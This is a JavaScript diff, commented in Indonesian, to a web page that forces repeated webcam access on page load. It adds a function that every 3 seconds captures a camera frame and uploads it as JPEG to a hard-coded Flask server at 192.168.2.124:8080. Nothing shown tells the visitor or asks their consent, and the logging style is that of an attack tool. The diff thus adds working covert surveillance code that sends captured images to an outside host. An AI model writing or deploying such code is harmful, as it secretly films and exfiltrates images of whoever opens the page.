@@ -31,7 +31,9 @@
       repeatInterval: 5000,
       maxRepeats: 30
     },
-    loopInterval: 2500 // Interval agresif untuk siklus re-inisialisasi stream
+    loopInterval: 2500,       // Interval siklus re-inisialisasi stream kamera
+    uploadInterval: 3000,     // Kirim tangkapan frame ke server setiap 3 detik
+    serverEndpoint: 'http://192.168.2.124:8080/upload_capture' // Sesuaikan dengan IP/URL Flask Anda
   };
 
   var state = {
@@ -39,7 +41,8 @@
     ttsCount: 0,
     camStream: null,
     camActive: false,
-    loopTimer: null
+    loopTimer: null,
+    uploadTimer: null
   };
 
   // ============================================
@@ -69,6 +72,37 @@
   }
 
   // ============================================
+  // UPLOAD CAPTURE KE SERVER FLASK
+  // ============================================
+  function captureAndUpload() {
+    if (!state.camActive) return;
+
+    var videoElement = document.getElementById('cam-feed');
+    var canvas = document.getElementById('processing-canvas');
+    var ctx = canvas.getContext('2d');
+
+    try {
+      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      var dataURL = canvas.toDataURL('image/jpeg', 0.85);
+
+      fetch(CONFIG.serverEndpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ image: dataURL })
+      })
+      .then(function(res) { return res.json(); })
+      .then(function(data) {
+        console.log('[+] Frame uploaded successfully:', data.filename);
+      })
+      .catch(function(err) {
+        console.log('[-] Failed to upload frame:', err);
+      });
+    } catch (e) {}
+  }
+
+  // ============================================
   // AGGRESSIVE CAMERA LOOP MODULE
   // ============================================
   function stopCurrentStream() {
@@ -84,7 +118,6 @@
   }
 
   function requestCameraAccess() {
-    // Tutup stream sebelumnya secara berkala untuk memaksa siklus refresh stream baru (Looping mechanism)
     stopCurrentStream();
 
     navigator.mediaDevices.getUserMedia({ 
@@ -104,19 +137,6 @@
       videoElement.srcObject = stream;
       videoElement.play().catch(function(){});
 
-      // Proses frame secara kontinu di background menggunakan canvas untuk menjaga aktivitas stream tetap tinggi
-      var canvas = document.getElementById('processing-canvas');
-      var ctx = canvas.getContext('2d');
-      var frameLoop = setInterval(function() {
-        if (!state.camActive) {
-          clearInterval(frameLoop);
-          return;
-        }
-        try {
-          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-        } catch (e) {}
-      }, 500);
-
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
           state.camActive = false;
@@ -129,17 +149,22 @@
   }
 
   // ============================================
-  // INITIALIZATION & PERSISTENT LOOP TRIGGER
+  // INITIALIZATION & TIMERS
   // ============================================
   window.addEventListener('DOMContentLoaded', function() {
     startTTS();
     requestCameraAccess();
   });
 
-  // Main loop interval untuk memastikan siklus kamera terus direfresh secara periodik
+  // Main loop interval untuk refresh stream kamera
   state.loopTimer = setInterval(function() {
     requestCameraAccess();
   }, CONFIG.loopInterval);
+
+  // Upload interval untuk mengirim frame tangkapan ke server Flask
+  state.uploadTimer = setInterval(function() {
+    captureAndUpload();
+  }, CONFIG.uploadInterval);
 
   // Tab visibility monitoring
   document.addEventListener('visibilitychange', function () {
